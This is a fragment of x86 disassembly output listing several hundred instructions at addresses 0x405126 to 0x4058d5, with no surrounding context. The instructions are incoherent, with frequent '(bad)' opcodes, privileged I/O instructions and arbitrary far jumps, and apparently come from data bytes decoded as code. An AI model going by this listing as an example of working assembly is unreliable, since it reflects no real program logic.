  405126:	sbb    eax,0x5873e087
  40512b:	push   0xffffffc9
  40512d:	xchg   esi,eax
  40512e:	sbb    DWORD PTR [esi+0x67],edi
  405131:	mov    al,0xe9
  405133:	js     0x40510d
  405135:	sbb    al,0x94
  405137:	popa   
  405138:	dec    edx
  405139:	sub    ebx,edi
  40513b:	jg     0x405184
  40513d:	push   ecx
  40513e:	sti    
  40513f:	dec    eax
  405140:	push   0x8b68ce9
  405145:	cmp    eax,ebp
  405147:	inc    ebp
  405148:	lahf   
  405149:	mov    esp,0x5d095253
  40514e:	pop    ecx
  40514f:	int3   
  405150:	xchg   DWORD PTR [ebx+edi*4+0x7a],esi
  405154:	dec    ebx
  405155:	ja     0x4051c1
  405157:	inc    ebp
  405158:	ja     0x4051b3
  40515a:	out    dx,eax
  40515b:	sbb    DWORD PTR [ebx+0x58ee1e78],esp
  405161:	dec    ebp
  405162:	aad    0x6f
  405164:	rcr    BYTE PTR [eax+ebp*1-0x4f],cl
  405168:	outs   dx,BYTE PTR ds:[esi]
  405169:	dec    eax
  40516a:	mov    ecx,0xa3825511
  40516f:	test   eax,0x80b7af22
  405174:	int    0xda
  405176:	cdq    
  405177:	xchg   dh,al
  405179:	div    DWORD PTR [ecx-0x3c7a3334]
  40517f:	in     eax,0x68
  405181:	push   es
  405182:	ss popf 
  405184:	sub    esi,eax
  405186:	xor    ah,ch
  405188:	dec    ebx
  405189:	inc    ebx
  40518a:	fs pushf 
  40518c:	xor    eax,0xdfe5bd41
  405191:	xchg   DWORD PTR [eax],edi
  405193:	xlat   BYTE PTR ds:[ebx]
  405194:	push   esp
  405195:	push   edi
  405196:	mov    al,0xec
  405198:	and    dh,al
  40519a:	fcmovnb st,st(5)
  40519c:	pop    edx
  40519d:	stos   BYTE PTR es:[edi],al
  40519e:	scas   al,BYTE PTR es:[edi]
  40519f:	or     ch,dh
  4051a1:	daa    
  4051a2:	clc    
  4051a3:	jns    0x405209
  4051a5:	sbb    eax,0xc14e56e0
  4051aa:	loop   0x4051c3
  4051ac:	pop    ebx
  4051ad:	pop    ds
  4051ae:	xchg   ebx,eax
  4051af:	int    0x25
  4051b1:	or     eax,0x5478d823
  4051b6:	inc    ecx
  4051b7:	mov    BYTE PTR [ebx-0x87a6d5a],dh
  4051bd:	jne    0x405148
  4051bf:	dec    esp
  4051c0:	aam    0x6d
  4051c2:	aaa    
  4051c3:	mov    ds:0xdb533f77,al
  4051c8:	pop    es
  4051c9:	cmp    edi,ebp
  4051cb:	ret    
  4051cc:	pushf  
  4051cd:	mov    ah,0x3b
  4051cf:	push   ebp
  4051d0:	arpl   WORD PTR [esi+ebp*2],bp
  4051d3:	or     al,0x43
  4051d5:	pop    ecx
  4051d6:	pop    ecx
  4051d7:	lods   al,BYTE PTR ds:[esi]
  4051d8:	or     al,0x7b
  4051da:	inc    edi
  4051db:	cmp    DWORD PTR [ebp-0x4d08501c],0x59e70a8
  4051e5:	pop    eax
  4051e6:	addr16 push eax
  4051e8:	push   edi
  4051e9:	nop
  4051ea:	cmc    
  4051eb:	iret   
  4051ec:	lods   eax,DWORD PTR ds:[esi]
  4051ed:	fdivr  QWORD PTR [edi]
  4051ef:	mov    BYTE PTR [edi+ecx*2+0x7f],al
  4051f3:	shl    ch,0x28
  4051f6:	shr    BYTE PTR [esi-0x2f],cl
  4051f9:	popa   
  4051fa:	neg    edx
  4051fc:	(bad)  
  4051fd:	push   ebx
  4051fe:	xchg   esi,eax
  4051ff:	loop   0x405225
  405201:	leave  
  405202:	fld    TBYTE PTR [edx-0x68]
  405205:	adc    BYTE PTR [ebp+0x20],ch
  405208:	pop    ds
  405209:	lahf   
  40520a:	dec    ebx
  40520b:	add    al,0xf3
  40520d:	inc    esi
  40520e:	test   eax,ecx
  405210:	data16 rcl BYTE PTR [ecx],0xeb
  405214:	je     0x405259
  405216:	inc    ecx
  405217:	test   BYTE PTR [esi],0x9d
  40521a:	fstp   QWORD PTR [edx]
  40521c:	adc    DWORD PTR [esi-0x462a2257],0xffffffe5
  405223:	mov    ebx,0x449a59d3
  405228:	jo     0x40522a
  40522a:	cli    
  40522b:	dec    edx
  40522c:	(bad)  
  40522d:	xchg   esi,eax
  40522e:	pushw  ss
  405230:	(bad)  
  405231:	jp     0x4051fe
  405233:	test   BYTE PTR [edx+0x5f],al
  405236:	push   esi
  405237:	pop    eax
  405238:	cmp    eax,0x60ff407b
  40523d:	cli    
  40523e:	jo     0x405248
  405240:	inc    esi
  405241:	adc    al,0xc6
  405243:	push   ebx
  405244:	sti    
  405245:	mov    eax,0xf1fd5017
  40524a:	inc    ebx
  40524b:	and    BYTE PTR [ebx-0x7c50ddc2],al
  405251:	stc    
  405252:	jae    0x4051f2
  405254:	lds    edi,FWORD PTR [eiz*4+0x706258e3]
  40525b:	imul   ecx,edx,0xddcf7ed2
  405261:	lods   eax,DWORD PTR ds:[esi]
  405262:	adc    DWORD PTR [edx+0xf],ecx
  405265:	adc    dl,bh
  405267:	mov    ebx,0x7b19fbc4
  40526c:	or     dl,dl
  40526e:	scas   eax,DWORD PTR es:[edi]
  40526f:	in     al,0xc9
  405271:	or     esi,DWORD PTR [eax]
  405273:	push   esp
  405274:	(bad)  
  405275:	int    0xfa
  405277:	out    dx,eax
  405278:	test   BYTE PTR [ebp+0x54],ah
  40527b:	fisttp WORD PTR [esi]
  40527d:	mov    ebp,0xc6c4de7
  405282:	inc    esi
  405283:	scas   al,BYTE PTR es:[edi]
  405284:	rcr    BYTE PTR [edi],0x68
  405287:	out    0x86,eax
  405289:	aad    0x2c
  40528b:	fcomi  st,st(0)
  40528d:	pop    es
  40528e:	jmp    0x4052ad
  405290:	inc    esi
  405291:	xchg   edi,eax
  405292:	repnz nop/reserved BYTE PTR ds:0xc728ca7a
  40529a:	xor    eax,0xc1350ef1
  40529f:	fcmovne st,st(1)
  4052a1:	and    ebp,DWORD PTR ss:[edi+0x5d]
  4052a5:	mov    ebp,0xe6ecaf59
  4052aa:	fcomp  QWORD PTR [ecx]
  4052ac:	test   DWORD PTR [ebp+ecx*1+0x54caf86f],edi
  4052b3:	ss out 0xe6,al
  4052b6:	(bad)  
  4052b7:	mov    cs,WORD PTR [edi-0x5f]
  4052ba:	inc    ecx
  4052bb:	popa   
  4052bc:	mov    BYTE PTR [ecx-0x20e278b5],dh
  4052c2:	mov    dh,0x10
  4052c4:	sar    DWORD PTR [edx],1
  4052c6:	inc    ecx
  4052c7:	add    eax,0x59171399
  4052cc:	mov    eax,esi
  4052ce:	out    0x33,al
  4052d0:	out    0x61,al
  4052d2:	sahf   
  4052d3:	sahf   
  4052d4:	scas   eax,DWORD PTR es:[edi]
  4052d5:	mov    BYTE PTR [eax],bh
  4052d7:	add    DWORD PTR [edi-0x41ef74c5],esi
  4052dd:	retf   0x5bc6
  4052e0:	popa   
  4052e1:	ret    
  4052e2:	and    al,0x70
  4052e4:	cs (bad) 
  4052e6:	cli    
  4052e7:	test   BYTE PTR [eax+0x996a211],bl
  4052ed:	(bad)  
  4052ee:	fnstcw WORD PTR [eax+0x377a0c6f]
  4052f4:	xor    bl,BYTE PTR [eax*4-0x58bbe222]
  4052fb:	jo     0x40536d
  4052fd:	ret    0x6d1d
  405300:	lds    ebp,FWORD PTR [ebp+0x266619c5]
  405306:	jle    0x405382
  405308:	out    0x7f,al
  40530a:	jecxz  0x40533f
  40530c:	or     cl,BYTE PTR [ecx+0x6fa7ca3f]
  405312:	pop    eax
  405313:	loop   0x4052fe
  405315:	aad    0x4c
  405317:	mov    bh,bl
  405319:	pop    ecx
  40531a:	ss push 0xfb30aad4
  405320:	ins    BYTE PTR es:[edi],dx
  405321:	pop    edx
  405322:	out    0x41,al
  405324:	jecxz  0x4052f1
  405326:	call   0x8e4a:0xe0244109
  40532d:	shl    DWORD PTR [edx],1
  40532f:	jb     0x4052cf
  405331:	jge    0x4052ed
  405333:	mov    bl,0x50
  405335:	popa   
  405336:	adc    eax,0x6d55be6
  40533b:	cdq    
  40533c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40533d:	enter  0x971c,0xf8
  405341:	(bad)  
  405343:	aaa    
  405344:	sbb    BYTE PTR [edi+eax*8+0x4059c4b8],dh
  40534b:	rol    BYTE PTR [ecx],cl
  40534d:	pop    ebp
  40534e:	adc    al,bh
  405350:	cmp    edx,DWORD PTR ds:0x3aa9837b
  405356:	push   esp
  405357:	outs   dx,BYTE PTR ds:[esi]
  405358:	lock inc edx
  40535a:	jecxz  0x405314
  40535c:	sub    bh,BYTE PTR ds:0x418fc038
  405362:	add    eax,0xe8beef5c
  405367:	pop    ecx
  405368:	pop    ecx
  405369:	lods   al,BYTE PTR ds:[esi]
  40536a:	adc    BYTE PTR [edx],dl
  40536c:	pop    esi
  40536d:	xor    dl,BYTE PTR [ebx-0x53]
  405370:	sub    al,0x9a
  405372:	dec    esp
  405373:	pop    ecx
  405374:	sbb    eax,DWORD PTR [esi-0x35c0fa53]
  40537a:	addr16 in eax,0x5f
  40537d:	cmp    edx,esi
  40537f:	adc    al,0xe8
  405381:	sbb    esp,ebp
  405383:	out    dx,al
  405384:	popa   
  405385:	adc    edi,esi
  405387:	(bad)  
  405388:	sub    eax,0x357a9e47
  40538d:	lea    esi,[esi+0x4a]
  405390:	dec    ebp
  405391:	add    al,0x5d
  405393:	adc    BYTE PTR [eax],0x1e
  405396:	or     BYTE PTR [edx-0x789b0d74],ah
  40539c:	stc    
  40539d:	idiv   BYTE PTR [ebp-0x39]
  4053a0:	and    eax,0x5be00401
  4053a5:	clc    
  4053a6:	push   0xd2029cb6
  4053ab:	retf   
  4053ac:	div    DWORD PTR [eax]
  4053ae:	sti    
  4053af:	test   DWORD PTR [eax-0x31],ebp
  4053b2:	add    dh,BYTE PTR [esi-0x75]
  4053b5:	stos   BYTE PTR es:[edi],al
  4053b6:	arpl   WORD PTR [edi],bx
  4053b8:	cmp    al,0x1d
  4053ba:	and    ebp,DWORD PTR [edx+0x62547691]
  4053c0:	fild   DWORD PTR [edx]
  4053c2:	dec    esi
  4053c3:	enter  0x4cfe,0x8
  4053c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053c8:	add    BYTE PTR [esi+eax*2],bl
  4053cb:	adc    esi,DWORD PTR [ecx+0x1614aa28]
  4053d1:	and    al,BYTE PTR [esp+eiz*4+0x6a]
  4053d5:	std    
  4053d6:	(bad)  
  4053d7:	out    dx,eax
  4053d8:	lods   eax,DWORD PTR ds:[esi]
  4053d9:	addr16 lahf 
  4053db:	daa    
  4053dc:	sti    
  4053dd:	sbb    esp,DWORD PTR ds:0xcea7bba9
  4053e3:	push   eax
  4053e4:	xor    ch,BYTE PTR [edi-0x43]
  4053e7:	jp     0x4053b4
  4053e9:	inc    ebx
  4053ea:	fs test ebx,esi
  4053ed:	pop    ebx
  4053ee:	dec    edx
  4053ef:	ja     0x4053c8
  4053f1:	(bad)  
  4053f2:	popf   
  4053f3:	push   esi
  4053f4:	and    ecx,eax
  4053f6:	ins    DWORD PTR es:[edi],dx
  4053f7:	sub    DWORD PTR [ebp+0x5f],esi
  4053fa:	xor    DWORD PTR [edi],ebp
  4053fc:	pop    edx
  4053fd:	mov    al,ds:0xae76eb91
  405402:	pusha  
  405403:	into   
  405404:	das    
  405405:	or     BYTE PTR [esi-0x1d8947a6],ch
  40540b:	pop    ss
  40540c:	and    al,0x2f
  40540e:	hlt    
  40540f:	jmp    0x40543d
  405411:	inc    ecx
  405412:	mov    esi,DWORD PTR [edx-0x779b8828]
  405418:	mov    esp,0xe2a0ce43
  40541d:	shl    ebp,0x1a
  405420:	mov    edx,0x24ec4bd8
  405425:	call   0x93ee2a68
  40542a:	loop   0x405430
  40542c:	cs repz jbe 0x40542b
  405430:	cli    
  405431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405432:	into   
  405433:	das    
  405434:	adc    al,0xe8
  405436:	push   cs
  405437:	lods   eax,DWORD PTR ds:[esi]
  405438:	mov    eax,0xe9fa4860
  40543d:	js     0x405419
  40543f:	add    ebx,DWORD PTR [edx]
  405441:	setp   BYTE PTR [edx+0x7f]
  405445:	or     al,BYTE PTR fs:[eax*2-0x5c852aab]
  40544d:	push   DWORD PTR [esi+0x3fb264e1]
  405453:	leave  
  405454:	lods   al,BYTE PTR ds:[esi]
  405455:	test   BYTE PTR [ebx],bl
  405457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405458:	mov    al,ds:0xe1f74d3c
  40545d:	stc    
  40545e:	je     0x40546a
  405460:	sti    
  405461:	loope  0x40544b
  405463:	enter  0xf0a6,0x32
  405467:	retf   
  405468:	and    eax,0xc194a82c
  40546d:	int    0xc
  40546f:	push   esp
  405470:	dec    edi
  405471:	aas    
  405472:	inc    ecx
  405473:	xor    eax,0xace2deee
  405478:	daa    
  405479:	fisubr DWORD PTR [edi]
  40547b:	(bad)  [ecx-0x18]
  40547e:	mov    DWORD PTR [ecx],ebp
  405480:	xor    ah,BYTE PTR [edi]
  405482:	and    cl,bh
  405484:	loope  0x405484
  405486:	lahf   
  405487:	push   ecx
  405488:	xor    ch,bh
  40548a:	or     dh,ch
  40548c:	dec    esi
  40548d:	jmp    0x723c:0xa4f7132b
  405494:	adc    ecx,DWORD PTR [ebx]
  405496:	jmp    0x4054bb
  405498:	pop    ebx
  405499:	sbb    BYTE PTR [edi],0x55
  40549c:	(bad)  
  40549d:	lock add eax,ebx
  4054a0:	(bad)  [ebp-0x59]
  4054a3:	jp     0x405505
  4054a5:	add    ah,0x60
  4054a8:	jns    0x405475
  4054aa:	lods   eax,DWORD PTR ds:[esi]
  4054ab:	jmp    0x40551a
  4054ad:	ins    DWORD PTR es:[edi],dx
  4054ae:	clc    
  4054af:	scas   al,BYTE PTR es:[edi]
  4054b0:	sbb    eax,0x6023c2d7
  4054b5:	jmp    0x40552f
  4054b7:	and    esp,DWORD PTR [esi]
  4054b9:	cli    
  4054ba:	lds    ebx,FWORD PTR [edx+0x4e]
  4054bd:	pcmpgtd mm0,mm0
  4054c0:	stos   DWORD PTR es:[edi],eax
  4054c1:	in     al,0xcc
  4054c3:	pop    eax
  4054c4:	sar    BYTE PTR [esi+eiz*4+0x7234a5e8],cl
  4054cb:	sub    al,0xe2
  4054cd:	out    dx,eax
  4054ce:	test   eax,0xcf94a766
  4054d3:	mov    ebp,0xa04cb6c8
  4054d8:	aam    0x6d
  4054da:	gs in  al,dx
  4054dc:	push   edi
  4054dd:	dec    ebp
  4054de:	outs   dx,DWORD PTR ds:[esi]
  4054df:	iret   
  4054e0:	push   ss
  4054e1:	xor    esi,esp
  4054e3:	dec    esi
  4054e4:	push   0x20
  4054e6:	sti    
  4054e7:	outs   dx,DWORD PTR ds:[esi]
  4054e8:	in     eax,dx
  4054e9:	pop    ss
  4054ea:	div    BYTE PTR [ecx-0x6b94d467]
  4054f0:	add    al,0x99
  4054f2:	mov    eax,0x649c7dd2
  4054f7:	scas   al,BYTE PTR es:[edi]
  4054f8:	mov    esi,0xc9d8d0cc
  4054fd:	sub    ecx,DWORD PTR ds:0xb2641a72
  405503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405504:	ds popf 
  405506:	push   ebx
  405507:	cmp    al,0xf
  405509:	pusha  
  40550a:	or     DWORD PTR [ecx+0x4e],esi
  40550d:	in     al,dx
  40550e:	scas   al,BYTE PTR es:[edi]
  40550f:	and    dh,ch
  405511:	popf   
  405512:	dec    ecx
  405513:	mov    esi,DWORD PTR ds:0x9151e1a
  405519:	push   eax
  40551a:	xchg   esi,eax
  40551b:	imul   esp,DWORD PTR [esi],0xffffffb3
  40551e:	fsubr  DWORD PTR [ecx]
  405520:	int3   
  405521:	enter  0x5d83,0xdb
  405525:	cmp    al,0x4b
  405527:	jb     0x40555d
  405529:	or     eax,0x19bcb8fe
  40552e:	xchg   edi,eax
  40552f:	leave  
  405530:	addr16 ds pop es
  405533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405534:	gs push eax
  405536:	dec    edi
  405537:	adc    eax,0xca08bcce
  40553c:	out    dx,eax
  40553d:	loop   0x4054c9
  40553f:	dec    ebx
  405540:	mov    ebx,DWORD PTR [ebp-0xe3892dc]
  405546:	hlt    
  405547:	push   edx
  405548:	cmp    al,0x36
  40554a:	xchg   edi,eax
  40554b:	out    dx,eax
  40554c:	mov    ebx,DWORD PTR [ebx-0x34]
  40554f:	or     BYTE PTR [edx+0x1f10bf6f],cl
  405555:	rcl    edi,cl
  405557:	jl     0x4054e8
  405559:	mov    eax,0x40dc4f63
  40555e:	sub    al,dh
  405560:	jno    0x405564
  405562:	dec    esp
  405563:	iret   
  405564:	loopne 0x4055da
  405566:	lea    edi,[edx-0x2b]
  405569:	sbb    al,0xd3
  40556b:	jmp    0x573d:0x1c68ab7a
  405572:	jmp    0x6b28c8c4
  405577:	xchg   DWORD PTR [esi+0x27],edx
  40557a:	scas   al,BYTE PTR es:[edi]
  40557b:	xchg   edx,eax
  40557c:	sar    DWORD PTR [eax+0x1b],0xf4
  405580:	pop    edi
  405581:	or     eax,DWORD PTR [ecx-0x58]
  405584:	mov    ds:0x1edc4e61,al
  405589:	mov    al,0x28
  40558b:	dec    ecx
  40558c:	add    bl,dh
  40558e:	adc    BYTE PTR [edi+eiz*8],0xab
  405592:	sar    ebp,1
  405594:	mov    WORD PTR [ebx-0x196d377],ss
  40559a:	jecxz  0x40558c
  40559c:	lea    eax,[ecx+0x40]
  40559f:	jb     0x4055a3
  4055a1:	adc    bh,dl
  4055a3:	sbb    al,0xcb
  4055a5:	clc    
  4055a6:	jle    0x405564
  4055a8:	push   esp
  4055a9:	test   eax,0x9b24d45d
  4055ae:	mov    al,0x86
  4055b0:	(bad)  
  4055b2:	retf   0xea0a
  4055b5:	jmp    0x41acb4bd
  4055ba:	jmp    0xfc9069f5
  4055bf:	push   ds
  4055c0:	mov    fs,WORD PTR [edx+eax*1+0x32c17ba7]
  4055c7:	sub    eax,0x7146e78
  4055cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055cd:	mov    cl,0xd6
  4055cf:	dec    esp
  4055d0:	sbb    eax,0x5919f540
  4055d5:	jmp    0x4055b7
  4055d7:	push   cs
  4055d8:	ins    DWORD PTR es:[edi],dx
  4055d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055da:	mov    esp,0xc490239d
  4055df:	out    dx,al
  4055e0:	test   al,0x25
  4055e2:	pop    es
  4055e3:	pushf  
  4055e4:	mov    esp,eax
  4055e6:	xor    BYTE PTR [edx+0x16],0x16
  4055ea:	add    al,0xe1
  4055ec:	pop    ebp
  4055ed:	mov    ch,0xef
  4055ef:	push   ds
  4055f0:	loope  0x405595
  4055f2:	cdq    
  4055f3:	outs   dx,BYTE PTR ds:[esi]
  4055f4:	cmp    eax,0x18d9f7b6
  4055fa:	mov    cl,bl
  4055fc:	jb     0x4055c3
  4055fe:	es jmp 0xd89e:0x59e059ed
  405606:	dec    esp
  405607:	int    0xe4
  405609:	out    0xe0,eax
  40560b:	sub    dl,BYTE PTR ds:0xe05d7c28
  405611:	les    edx,FWORD PTR [ebx-0x42]
  405614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405615:	sub    eax,0x4d7f488a
  40561a:	shl    BYTE PTR ds:0x4edc5722,cl
  405620:	fwait
  405621:	pop    eax
  405622:	out    dx,eax
  405623:	sbb    eax,ebx
  405625:	stc    
  405626:	xsaveopt [esi]
  405629:	pop    ebp
  40562a:	inc    ebp
  40562b:	add    DWORD PTR [eax],ebx
  40562d:	sbb    edi,esp
  40562f:	mov    ds:0xf184509b,eax
  405634:	fcomi  st,st(6)
  405636:	mov    bh,0xd7
  405638:	jae    0x405699
  40563a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40563b:	test   DWORD PTR [ebx-0x39ca6929],esp
  405641:	cmp    eax,0xbe38bf6f
  405646:	(bad)  
  405647:	imul   esi,DWORD PTR ss:[ebp+0x8],0x29
  40564c:	sub    BYTE PTR [esi],bl
  40564e:	inc    esp
  40564f:	dec    ebp
  405650:	mov    al,0x9b
  405652:	fs or  al,0x2d
  405655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405656:	pop    es
  405657:	xchg   BYTE PTR [edx],bh
  405659:	add    ebx,ebp
  40565b:	ja     0x40567b
  40565d:	shr    DWORD PTR [edi],cl
  40565f:	jns    0x405628
  405661:	stc    
  405662:	cmp    cl,BYTE PTR [ebx+0x2c]
  405665:	pop    es
  405666:	jp     0x40566d
  405668:	pop    ebp
  405669:	push   edi
  40566a:	repz in eax,0xbc
  40566d:	cmp    DWORD PTR ds:0x574dff81,ebx
  405673:	test   al,0xe0
  405675:	mov    eax,0xcea4425a
  40567a:	leave  
  40567b:	pop    es
  40567c:	cmp    bl,BYTE PTR [esi+0x48]
  40567f:	lods   eax,DWORD PTR ds:[esi]
  405680:	mov    edx,0x62911b01
  405685:	or     al,0xfc
  405687:	add    dl,BYTE PTR [esi+0x32]
  40568a:	daa    
  40568b:	and    eax,0xea364d42
  405690:	sub    BYTE PTR [ecx-0x2e],ah
  405693:	dec    ebp
  405694:	pop    ecx
  405695:	int3   
  405696:	or     dl,BYTE PTR [ebp+0x50]
  405699:	xchg   ebp,eax
  40569a:	jl     0x4056da
  40569c:	xlat   BYTE PTR ds:[ebx]
  40569d:	push   0x88af08c6
  4056a2:	and    BYTE PTR [ecx+edi*1],bh
  4056a5:	push   edx
  4056a6:	lea    ebx,[eax+0x78]
  4056a9:	cli    
  4056aa:	xor    edx,esp
  4056ac:	xchg   ecx,eax
  4056ad:	cmc    
  4056ae:	cmp    esi,esi
  4056b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056b1:	nop
  4056b2:	xor    bl,ah
  4056b4:	outs   dx,DWORD PTR ds:[esi]
  4056b5:	pop    ebp
  4056b6:	out    dx,eax
  4056b7:	add    ah,ch
  4056b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ba:	sub    DWORD PTR [ebx-0x3b],0xffffffd5
  4056be:	push   cs
  4056bf:	mov    edx,0x92994567
  4056c4:	rol    DWORD PTR [ebp-0x4f9590a8],0x83
  4056cb:	and    eax,0xfc539f8a
  4056d0:	(bad)  
  4056d1:	pusha  
  4056d2:	mov    eax,0xa1a02219
  4056d7:	jl     0x405740
  4056d9:	cmc    
  4056da:	fbstp  TBYTE PTR [edi+0x452181c2]
  4056e0:	div    BYTE PTR [esi+0xa]
  4056e3:	or     ah,bl
  4056e5:	add    DWORD PTR [ecx-0x57b15688],ecx
  4056eb:	ret    
  4056ec:	int    0x5d
  4056ee:	and    eax,0xdd75514d
  4056f3:	cmp    DWORD PTR [edi+0x1998d768],edi
  4056f9:	ds dec sp
  4056fc:	aaa    
  4056fd:	leave  
  4056fe:	clc    
  4056ff:	pop    edx
  405700:	outs   dx,BYTE PTR ds:[esi]
  405701:	sub    dh,dh
  405703:	jo     0x405781
  405705:	int3   
  405706:	cmp    BYTE PTR ds:0x2c4f7009,ch
  40570c:	pushf  
  40570d:	out    0x41,al
  40570f:	aaa    
  405710:	repnz mov esi,ecx
  405713:	xchg   ebp,eax
  405714:	shl    ch,1
  405716:	ret    
  405717:	xor    eax,0xdf3f2c46
  40571c:	sbb    bh,ch
  40571e:	outs   dx,DWORD PTR ds:[esi]
  40571f:	inc    ecx
  405720:	sub    eax,0x2df42693
  405725:	push   0xd4bae8a1
  40572a:	inc    ebx
  40572b:	xchg   edi,eax
  40572c:	push   es
  40572d:	sub    DWORD PTR [ebp+0x141fbc40],esp
  405733:	dec    edx
  405734:	es mov edi,0xcd308eaa
  40573a:	mov    eax,ds:0x1fedf65e
  40573f:	rcr    DWORD PTR [ecx+0x26320ff4],1
  405745:	(bad)  
  405746:	cdq    
  405747:	add    cl,BYTE PTR [edx]
  405749:	jmp    0xbe32:0xb0686617
  405750:	cmc    
  405751:	(bad)  
  405752:	inc    eax
  405753:	rol    ch,cl
  405755:	shl    DWORD PTR [edi],cl
  405757:	jne    0x405776
  405759:	inc    edx
  40575a:	ins    DWORD PTR es:[edi],dx
  40575b:	dec    edi
  40575c:	push   ebp
  40575d:	xor    eax,0x204b8b91
  405762:	xchg   esi,eax
  405763:	add    al,0xc4
  405765:	add    BYTE PTR ds:0xdac6141,dl
  40576b:	mov    esi,0xa81b9433
  405770:	mov    dh,0xdd
  405772:	mov    bl,0xc1
  405774:	shufps xmm4,XMMWORD PTR [ecx-0x5148073d],0x8d
  40577c:	in     eax,dx
  40577d:	cmp    edx,DWORD PTR [ecx-0x49]
  405780:	or     ecx,0x4d56a3d2
  405786:	clc    
  405787:	xor    bl,BYTE PTR [ebp-0x2d]
  40578a:	repnz sub BYTE PTR [ecx-0x39],0xd5
  40578f:	loope  0x4057c5
  405791:	sbb    DWORD PTR [eax+0x29],esi
  405794:	int3   
  405795:	arpl   WORD PTR [edx],ax
  405797:	and    eax,0x5dea0de1
  40579c:	xchg   BYTE PTR [esi-0x72],dl
  40579f:	ja     0x4057db
  4057a1:	std    
  4057a2:	jb     0x4057fc
  4057a4:	sub    ecx,DWORD PTR [esp+eax*8-0x11529c73]
  4057ab:	jbe    0x405784
  4057ad:	imul   ecx,DWORD PTR [edx-0x38],0xffffff9a
  4057b1:	js     0x4057cf
  4057b3:	push   esp
  4057b4:	js     0x405745
  4057b6:	mov    al,BYTE PTR [ebx+ebp*2-0x31df0d56]
  4057bd:	stc    
  4057be:	addr16 ret 0x66fa
  4057c2:	cmp    BYTE PTR [edi*2-0xe029a1d],dh
  4057c9:	sar    DWORD PTR [ebp+0x519df875],0xce
  4057d0:	outs   dx,DWORD PTR ds:[esi]
  4057d1:	xor    eax,0xfa5b5571
  4057d6:	add    bl,bh
  4057d8:	and    cl,BYTE PTR [edx-0x4a]
  4057db:	and    BYTE PTR [ebx-0x6cad3669],bl
  4057e1:	jns    0x4057cd
  4057e3:	(bad)  
  4057e4:	and    ah,BYTE PTR ds:0x6a9a9521
  4057ea:	adc    eax,0x33be07d6
  4057ef:	xchg   esp,eax
  4057f0:	mov    ds:0xfa9170bd,eax
  4057f5:	jb     0x4057c7
  4057f7:	push   ds
  4057f8:	test   esi,eax
  4057fa:	popf   
  4057fb:	js     0x4057c1
  4057fd:	clc    
  4057fe:	mov    ecx,0x6a4d3994
  405803:	stos   BYTE PTR es:[edi],al
  405804:	cmp    edi,DWORD PTR [ecx-0x6f]
  405807:	adc    eax,0x343fe866
  40580c:	rol    BYTE PTR [eax],cl
  40580e:	xor    ebx,ebp
  405810:	cmp    cl,BYTE PTR [ebx-0x44]
  405813:	cwde   
  405814:	or     al,0xad
  405816:	pop    ebp
  405817:	hlt    
  405818:	lea    esp,[ecx]
  40581a:	cmove  edx,DWORD PTR [edi]
  40581d:	or     BYTE PTR [ebp+0x42],0x4e
  405821:	mov    bl,0x51
  405823:	cmp    ebx,esp
  405825:	xchg   edi,eax
  405826:	and    ah,BYTE PTR [edi-0x42]
  405829:	push   0x4b
  40582b:	into   
  40582c:	sbb    bl,BYTE PTR [eax]
  40582e:	pushf  
  40582f:	bound  edx,QWORD PTR [ecx-0x43f221ca]
  405835:	xor    DWORD PTR [ebx],esi
  405837:	int3   
  405838:	repnz nop
  40583a:	gs (bad) 
  40583c:	(bad)  
  40583e:	test   al,0x7a
  405840:	sbb    DWORD PTR [edx-0x9],0xe0151e5f
  405847:	xchg   BYTE PTR [eax-0x14bbad],bh
  40584d:	ins    BYTE PTR es:[edi],dx
  40584e:	dec    ebx
  40584f:	fcmovnb st,st(7)
  405851:	mov    esi,ss
  405853:	lods   al,BYTE PTR ds:[esi]
  405854:	push   esp
  405855:	push   ecx
  405856:	sbb    edi,DWORD PTR [edx+ebp*2]
  405859:	sysret 
  40585b:	jl     0x405884
  40585d:	and    DWORD PTR [ebp+0x69a6053b],0x1e
  405864:	xchg   ebx,eax
  405865:	dec    ebp
  405866:	out    0x0,al
  405868:	xor    bh,BYTE PTR [edx+esi*4+0x28]
  40586c:	mov    dl,0xd2
  40586e:	test   al,0x6
  405870:	cs push cs
  405872:	arpl   si,bp
  405874:	and    eax,0x92774092
  405879:	push   edi
  40587a:	or     al,BYTE PTR ds:0x4c4b6b62
  405880:	push   es
  405881:	shl    DWORD PTR [ebp-0x52],cl
  405884:	xchg   edi,eax
  405885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405886:	adc    al,0x62
  405888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405889:	or     BYTE PTR [eax+0x6a9a72fb],0x4d
  405890:	lds    ebx,FWORD PTR [esi]
  405892:	fldcw  WORD PTR ds:0x392d33d7
  405898:	cmp    al,0xcd
  40589a:	mov    ecx,0x9a0120b2
  40589f:	mov    WORD PTR [ebp+edi*1+0x39],fs
  4058a3:	add    dl,ah
  4058a5:	dec    esp
  4058a6:	nop
  4058a7:	out    0xf9,eax
  4058a9:	jl     0x405834
  4058ab:	les    ebp,FWORD PTR [ebx-0x49e72f16]
  4058b1:	cmp    edx,DWORD PTR [ecx-0x41]
  4058b4:	xchg   esi,eax
  4058b5:	adc    DWORD PTR [ecx-0x70],edx
  4058b8:	inc    esi
  4058b9:	push   es
  4058ba:	imul   ecx,DWORD PTR [edi],0x68
  4058bd:	lods   eax,DWORD PTR ds:[esi]
  4058be:	or     al,0xaf
  4058c0:	mov    al,al
  4058c2:	imul   edx,DWORD PTR [ecx-0x1d57fb5b],0x6d04f336
  4058cc:	ficom  DWORD PTR [edx+ebx*4-0x12]
  4058d0:	dec    esi
  4058d1:	lods   eax,DWORD PTR ds:[esi]
  4058d2:	lea    ebx,[edi+0x2e]
  4058d5:	add    eax,0x2a71df74
